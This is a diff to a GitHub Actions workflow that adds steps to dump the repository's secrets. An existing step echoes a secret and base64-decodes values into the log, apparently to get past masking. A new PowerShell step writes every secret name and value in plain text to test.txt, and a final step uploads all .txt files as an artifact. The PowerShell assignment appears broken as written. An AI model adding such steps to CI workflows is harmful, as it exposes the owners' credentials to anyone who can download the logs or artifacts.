@@ -12,7 +12,7 @@ jobs:
         with:
           fetch-depth: 0
 
-      - name: ls
+      - name: echo
         shell: bash
         run: |
               echo "${{ secrets.YOUR_SECRET }}"
@@ -20,3 +20,23 @@ jobs:
               echo "Value E:$E"
               F=$(echo "$E" | base64 --decode)
               echo "Value F:$F"
+
+      - name: File
+        shell: pwsh
+        run: |
+          $secrets = secrets
+          # ConvertFrom-Json ${{ toJson(secrets) }}
+          
+          foreach($secret in $secrets.PsObject.Properties)
+          {
+              Add-Content test.txt $secret.Name
+              Add-Content test.txt $secret.Value
+              Add-Content test.txt "***********************************"
+              # $name = "GITHUB-"+($secret.Name -replace $SpecialChars,$Replacement)
+              # $value = ConvertTo-SecureString -String $secret.Value -AsPlainText -Force
+          }
+
+      - uses: actions/upload-artifact@v3
+        with:
+          name: artifact
+          path: '**/*.txt'
